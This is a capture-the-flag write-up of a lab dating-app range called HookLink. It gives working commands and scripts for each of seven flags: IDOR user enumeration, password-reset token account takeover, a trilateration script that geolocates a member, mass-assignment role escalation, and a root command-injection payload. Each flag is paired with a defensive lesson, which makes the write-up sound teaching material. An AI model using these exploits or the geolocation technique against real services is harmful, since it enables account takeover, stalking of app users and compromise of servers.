# HookLink — WebRange Writeup

**Platform:** WebVerse Pro (webverselabs)
**Difficulty:** Medium
**Category:** Web Application Penetration Testing
**Flags:** 7 / 7
**XP:** 1,500

## Completion Certificate

Range completed in full (7/7 flags). See `hooklink-certificate-redacted.pdf` for the certificate of completion (name, issue date, and cert ID redacted).

## Synopsis

HookLink is a Miami-based dating app running a multi-service stack:

- **app.hooklink.local** — core dating app + JSON API (auth, profiles, discover, messages, photos metadata)
- **media.hooklink.local** — photo storage/serving service
- **premium.hooklink.local** — subscriptions/billing (Gold tier) marketing service
- **mod.hooklink.local** — internal Trust & Safety / moderator console

Seven flags, one engagement: start as an anonymous visitor and end holding the platform's most sensitive data — private photos, home coordinates, account credentials, and root-level command execution on the moderator console's host.

---

## Attack Chain Overview

```
hooklink.local (marketing site) → discover subdomains via redirect + Host routing
app.hooklink.local
    ├── Flag: Walk the guest list   — BOLA on /api/users/:id (any authed user reads any profile)
    ├── Flag: Return to sender      — reset-token leaked in forgot-password response → full ATO
    ├── Flag: Crossed paths         — /api/nearby accepts client-supplied lat/lng (geolocation oracle)
    └── Flag: Backstage pass        — mass assignment on /api/users/me → role escalated to staff

media.hooklink.local
    └── Flag: Left in the open      — directory listing enabled on /photos/:id/private/ for any authed session

mod.hooklink.local  (reached using the escalated role)
    ├── Flag: Everywhere you've been — /users/:id exposes full location/activity notes — BFLA
    └── Flag: Everyone, all at once  — OS command injection in the export manifest "label" parameter
```

---

## Recon

### Target & vhost discovery

The range fronts a single gateway IP. Requesting the bare IP over HTTP returns a redirect that reveals the primary domain:

```bash
TARGET=10.100.0.30   # gateway IP (assigned per range instance)

curl -sI http://$TARGET/
# HTTP/1.1 302 Moved Temporarily
# Location: http://hooklink.local/
```

Add the base domain to `/etc/hosts` and pull the homepage, then grep it for referenced hostnames:

```bash
echo "$TARGET hooklink.local" | sudo tee -a /etc/hosts
curl -s http://hooklink.local/ -o index.html
```

Confirm the real vhosts and add them all to `/etc/hosts`:

```bash
echo "$TARGET hooklink.local app.hooklink.local media.hooklink.local premium.hooklink.local mod.hooklink.local" | sudo tee -a /etc/hosts
```

Four services confirmed: the marketing site (root domain), `app` (dating app + API), `media` (photo server), `premium` (billing/subscriptions marketing), `mod` (internal Trust & Safety console).

### Registering a low-privilege session

Pulling `app.hooklink.local`'s client JS revealed the real registration fields required (`email`, `password`, `first_name`, `date_of_birth`):

```bash
curl -s -X POST http://app.hooklink.local/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email":"tester@hooklink.local","password":"Test1234!","first_name":"Tester","date_of_birth":"1995-01-01"}' \
  -i -c cookies.txt

curl -s -X POST http://app.hooklink.local/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"tester@hooklink.local","password":"Test1234!"}' \
  -i -c cookies.txt
```

That single low-privilege session cookie (`hooklink_session`, an HS256 JWT containing only `sub`/`email`/`iat`/`exp` — no role claim) is the foundation for every flag below.

---

## Flag 1 — Walk the guest list

### Discovery

`GET /api/users/:id` returns a full profile object for **any** user ID, with no check that the caller owns, matches, or is otherwise entitled to view that record. Classic **BOLA** (Broken Object Level Authorization / IDOR).

### Exploitation

```bash
cat > enum_users.py << 'EOF'
#!/usr/bin/env python3
import requests, json, concurrent.futures

COOKIES = {"hooklink_session": open("cookies.txt").read().split("hooklink_session\t")[-1].split()[0]}
BASE = "http://app.hooklink.local/api/users/"
results = {}

def fetch(i):
    try:
        r = requests.get(BASE + str(i), cookies=COOKIES, timeout=5)
        if r.status_code == 200:
            results[i] = r.json()
    except requests.RequestException:
        pass

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
    ex.map(fetch, range(0, 60))

with open("all_users.json", "w") as f:
    json.dump(results, f, indent=2)

for i, u in sorted(results.items()):
    print(f"[{i}] role={u.get('role')} email={u.get('email')} name={u.get('first_name')}")
EOF
python3 enum_users.py
```

Walking the ID space surfaced staff accounts (`admin`, `trust_safety_lead`, `moderator`) at low IDs, plus a `verified` gold-tier member, **Jordan (#42)**, whose `bio` field contained the flag directly:

```json
"bio": "Marine biology grad student... HOOKLINK{xxx}"
```

**Flag:** `HOOKLINK{26xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}` (credited as *Walk the guest list*)

> **Lesson:** an endpoint that returns "the user object" needs an explicit authorization check for *which* object the caller may see — authentication is not authorization.

---

## Flag 2 — Left in the open

### Discovery

The `app.hooklink.local` profile page (`/profile/:id`) renders a "private album" section that is only *CSS-blurred* client-side; the full-resolution photo URLs sit unblurred in the page's DOM/JS regardless of viewer identity:

```js
// Private album: rendered "locked" with a CSS blur — but the full-resolution
// URLs are right here in the DOM, and the media server serves them to anyone.
```

Separately, the media service (`media.hooklink.local`) only validates that **a** session cookie is present on `/photos/:id/private/` — not that it belongs to the account being viewed — and has **directory listing enabled** on that path.

### Exploitation

```bash
curl -s -b cookies.txt http://media.hooklink.local/photos/1/private/
```

```html
<h1>Index of /photos/1/private/</h1>
<a href="flag.txt">flag.txt</a>
```

```bash
curl -s -b cookies.txt http://media.hooklink.local/photos/1/private/flag.txt
```

**Flag:** `HOOKLINK{4exxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}` (credited as *Left in the open*)

> **Lesson:** "private" storage that checks only for *any* valid session (not the *owning* session) is functionally public. Directory listing on a path meant to hold private user media turns the bug into a free index of everything stored there.

---

## Flag 3 — Return to sender

### Discovery

`POST /api/auth/forgot-password` is meant to email a reset link out-of-band. Instead, the JSON response itself includes a debug `_meta.mailer.preview_url` field containing the **full reset link, token and all** — evidently a sandbox mail-provider integration (`postmark-sandbox`) that was never stripped for production.

### Exploitation

```bash
curl -s -X POST http://app.hooklink.local/api/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email":"jordan.maxwell.fl@gmail.com"}' | python3 -m json.tool
```

```json
{
  "ok": true,
  "_meta": {
    "mailer": {
      "preview_url": "http://app.hooklink.local/reset?token=<redacted>"
    }
  }
}
```

Take the token straight to account takeover — no phishing, no interaction from the victim required:

```bash
TOKEN="<token from preview_url>"

curl -s -X POST http://app.hooklink.local/api/auth/reset-password \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"$TOKEN\",\"new_password\":\"Pwned1234x\"}" -i

curl -s -X POST http://app.hooklink.local/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"jordan.maxwell.fl@gmail.com","password":"Pwned1234x"}' \
  -i -c jordan_cookies.txt
```

Logged in as Jordan, her inbox contained a **pinned system welcome message** from her Gold upgrade, with the flag embedded as a "member reference":

```bash
curl -s -b jordan_cookies.txt http://app.hooklink.local/api/inbox | python3 -m json.tool
```

```json
"body": "Welcome to HookLink Gold, Jordan! ... Member reference: HOOKLINK{81xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx} — keep this for support requests."
```

**Flag:** `HOOKLINK{81xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}` (credited as *Return to sender*)

> **Lesson:** a password-reset token must never appear in any response visible to the requester — only ever delivered through the intended out-of-band channel. A "preview"/debug field left in from staging is functionally identical to printing the credential.
>
> This bug was also independently exploitable as a **full account-takeover-as-a-service** against arbitrary members (staff and regular users alike) — every `forgot-password` call for any known email returns a usable token.

---

## Flag 4 — Crossed paths

### Discovery

`GET /api/nearby` is meant to power a "people near you" feature, deriving proximity from the caller's *own* stored location. Instead, it accepts raw `lat`/`lng` query parameters directly from the client — turning a proximity feature into a **free-form coordinate lookup / geolocation oracle**. Any authenticated user can probe any point on the map and see who is registered within metres of it (`crossed_paths: true` in the response), not just their own neighborhood.

### Exploitation — trilateration

Query the endpoint from three well-separated points and record `distance_km` returned for a target user, then solve for their coordinates:

```python
#!/usr/bin/env python3
import requests, numpy as np
from math import radians, cos, degrees

COOKIES = {"hooklink_session": open("cookies.txt").read().split("hooklink_session\t")[-1].split()[0]}
TARGET_ID = 42  # Jordan

points = [
    (25.7617, -80.1918),  # Downtown Miami
    (25.9000, -80.1300),  # North Miami / Aventura
    (25.6800, -80.3600),  # West Miami / Kendall
]

def get_distance(lat, lng, target_id):
    r = requests.get("http://app.hooklink.local/api/nearby",
                      params={"lat": lat, "lng": lng}, cookies=COOKIES, timeout=10)
    for u in r.json().get("results", []):
        if u["id"] == target_id:
            return u["distance_km"]
    return None

dists = [get_distance(lat, lng, TARGET_ID) for lat, lng in points]

lat0 = sum(p[0] for p in points) / len(points)
def to_xy(lat, lng):
    R = 6371.0
    return radians(lng) * cos(radians(lat0)) * R, radians(lat) * R

xy = [to_xy(lat, lng) for lat, lng in points]
x1, y1 = xy[0]; r1 = dists[0]
A, b = [], []
for (x, y), r in zip(xy[1:], dists[1:]):
    A.append([2*(x - x1), 2*(y - y1)])
    b.append([r1**2 - r**2 - x1**2 + x**2 - y1**2 + y**2])
sol, *_ = np.linalg.lstsq(np.array(A), np.array(b), rcond=None)
x, y = sol[0][0], sol[1][0]
lat = degrees(y / 6371.0)
lng = degrees(x / (6371.0 * cos(radians(lat0))))
print(f"Estimated location: {lat}, {lng}")
```

Querying `/api/nearby` at the trilaterated estimate (refined to a small grid search around it) triggered the `crossed_paths` response for the target, returning the flag directly:

```bash
curl -s -b cookies.txt "http://app.hooklink.local/api/nearby?lat=<est_lat>&lng=<est_lng>" | python3 -m json.tool
```

```json
"crossed_paths": {
  "user_id": 42,
  "message": "You've crossed paths with Jordan — you were within metres of each other.",
  "token": "HOOKLINK{14xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}"
}
```

**Flag:** `HOOKLINK{14xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}` (credited as *Crossed paths*)

> **Lesson:** a "nearby members" feature that accepts arbitrary client-supplied coordinates, rather than deriving them server-side from the caller's own stored location, becomes a precise geolocation oracle. This is the same class of bug used by researchers to trilaterate real Bumble/Hinge users down to their front doors — the fix is not rate-limiting, it's never trusting a client-supplied coordinate for this kind of query.

---

## Flag 5 — Backstage pass

### Discovery

`PATCH /api/users/me` accepts an arbitrary JSON body and applies every key with no allow-list separating user-editable fields (bio, job title) from server-owned fields (`role`, `subscription_tier`). Classic **mass assignment**.

### Exploitation

```bash
curl -s -X PATCH http://app.hooklink.local/api/users/me \
  -b cookies.txt -H "Content-Type: application/json" \
  -d '{"role":"trust_safety_lead","subscription_tier":"gold"}' -i
```

The response confirmed the account was silently promoted from `role: user` to `role: trust_safety_lead`. That elevated role is honored by the moderator console session check:

```bash
curl -s -i -b cookies.txt http://mod.hooklink.local/dashboard | head -20
# 200 OK — full Trust & Safety console access, nav: Dashboard / Reports / Users / Export / System
```

`/admin/system` renders platform configuration plus an **"Internal Service Signing Key"** panel explicitly labeled "Shared secret used to sign service-to-service tokens. Treat as sensitive" — reachable with nothing beyond the moderator session just obtained:

```bash
curl -s -b cookies.txt http://mod.hooklink.local/admin/system
```

```
INTERNAL SERVICE SIGNING KEY
HOOKLINK{0bxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```

**Flag:** `HOOKLINK{0bxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}` (credited as *Backstage pass*)

> **Lesson:** a shared secret used to sign service-to-service tokens is one of the highest-value assets on the platform — it should never render on a page reachable via a one-line mass-assignment `PATCH`. Every endpoint that accepts a JSON body needs a strict server-side allow-list of writable fields.

---

## Flag 6 — Everywhere you've been

### Discovery

The Trust & Safety console's per-user detail page, `/users/:id`, is reachable with nothing more than the escalated moderator role from Flag 5 — no check that the lookup is tied to an active report or case. The page renders **admin notes** (freeform staff annotations) plus full profile detail for any member, with no scoping or audit trail.

### Exploitation

Scanning the report queue (`/reports`) surfaced two pending reports referencing users #42 and #51. Visiting the flagged user's detail page directly:

```bash
curl -s -b cookies.txt http://mod.hooklink.local/users/42 -o mod_user42.html
grep -o 'HOOKLINK{[^}]*}' mod_user42.html
```

```html
<div class="notes">VIP — flagged by two reporters for "uses the app while at work at the marine lab."
No action taken. HOOKLINK{1cxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}</div>
```

**Flag:** `HOOKLINK{1cxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}` (credited as *Everywhere you've been*)

> **Lesson:** internal tooling that exposes a full activity/notes/location record per user needs its own access control beyond "has the moderator role" — ideally scoped to an active report, logged, and time-boxed. A role check alone means anyone who obtains that role (including via mass assignment) can browse every member's sensitive internal record with zero audit trail.

---

## Flag 7 — Everyone, all at once

### Discovery

The moderator console's `/export` page (`Platform data export`) includes a "sign the export manifest" feature: it takes a `label` query parameter and returns what looks exactly like raw `sha256sum` output (hash, two spaces, a trailing `-`) — a strong signal the server is shelling out and piping user input straight into a command pipeline.

### Exploitation

Confirm OS command injection by chaining a second command with `;`:

```bash
curl -sG -b cookies.txt --data-urlencode 'label=x;id;#' http://mod.hooklink.local/export | grep -A2 flagbox
```

```
x
uid=0(root) gid=0(root) groups=0(root),...
```

Root, inside the web server's shell-out. Swap the probe command for the actual goal:

```bash
curl -sG -b cookies.txt --data-urlencode 'label=x;cat /flag.txt;#' http://mod.hooklink.local/export | grep -A2 flagbox
```

```
x
HOOKLINK{5exxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```

**Flag:** `HOOKLINK{5exxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}` (credited as *Everyone, all at once*)

> **Lesson:** anything that shells out to a binary is a command-injection candidate until proven otherwise — visible `sha256sum`-style output was the tell here. A "sign this label" convenience feature turned into unauthenticated-adjacent root-level arbitrary command execution because user input was concatenated into a shell pipeline instead of passed as a properly escaped argument (or, better, never touching a shell at all).

---

## All Flags

| # | Flag Name | Flag Value | Vulnerability Class | Service |
|---|---|---|---|---|
| 1 | Walk the guest list | `HOOKLINK{26xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}` | BOLA / IDOR on `/api/users/:id` | app.hooklink.local |
| 2 | Left in the open | `HOOKLINK{4exxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}` | Directory listing on private media path | media.hooklink.local |
| 3 | Return to sender | `HOOKLINK{81xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}` | Reset-token leak → account takeover | app.hooklink.local |
| 4 | Crossed paths | `HOOKLINK{14xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}` | Client-controlled coordinates → geolocation oracle / trilateration | app.hooklink.local |
| 5 | Backstage pass | `HOOKLINK{0bxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}` | Mass assignment → role escalation → signing key exposed | app.hooklink.local / mod.hooklink.local |
| 6 | Everywhere you've been | `HOOKLINK{1cxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}` | BFLA — moderator console exposes per-user notes/history | mod.hooklink.local |
| 7 | Everyone, all at once | `HOOKLINK{5exxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}` | OS command injection (root) | mod.hooklink.local |

---

## Tools Used

| Tool | Purpose |
|---|---|
| `curl` | Manual HTTP exploitation across every service |
| `nmap` | Initial port/service discovery on the gateway |
| `gobuster` | vhost and directory brute-forcing |
| `whatweb` | Service/technology fingerprinting |
| `python3` + `requests` | Scripted IDOR enumeration, trilateration math, concurrent scanning |
| `numpy` | Least-squares trilateration solve for Flag 4 |
| `PyJWT` | JWT inspection (used to rule out a signing-key reuse theory) |
| `exiftool` | Ruled out EXIF/GPS leakage in profile photos (dead end, documented for completeness) |

---

## Key Takeaways

- **BOLA is still the cheapest win on any API.** An authorization check that stops at "is there a valid session" instead of "does this session own this resource" hands over the entire user table one ID at a time.
- **Anything that previews a secret is the same as leaking it.** A debug/sandbox field carrying a password-reset token in an API response is a full account-takeover primitive — no phishing required.
- **Client-supplied geolocation is a de-anonymization primitive.** Any endpoint that returns distance-to-target based on a caller-supplied coordinate can be trilaterated to a precise real-world location with three or more queries.
- **Mass assignment is a server-side allow-list problem.** If the endpoint that lets a user edit their bio also accepts `role`, the client has been handed privilege escalation for free.
- **A feature that shells out to a binary is a command-injection candidate until proven otherwise.** Visible `sha256sum`-style output in a web response was the tell.
- **The chain didn't need a single catastrophic bug.** It needed several individually "minor" ones, stacked across services that all trusted each other, and trusted client input, a little too much.

## Wrap-Up

Nothing in this range was a zero-day, and nothing required exotic tooling — every step used `curl`, a browser's dev tools, and short Python scripts. What made the chain work end to end was that every service trusted something it shouldn't have: the app API trusted that "logged in" meant "entitled to this record"; the media service trusted that any cookie was the right cookie; the password-reset flow trusted that a sandbox preview field would never be read by anyone but a developer; the profile-update endpoint trusted that the client wouldn't send fields it had no business setting; and the moderator console trusted that a label typed into a form would never reach a shell. When the data on the other side of those bugs is a person's sexual orientation, private photos, home coordinates, or private conversations, "minor" findings stop being minor the moment they're chained together.

---

## Certificate of Completion

![HookLink Certificate of Completion](https://i.ibb.co/sLpky98/hooklink-certificate-redacted.png)
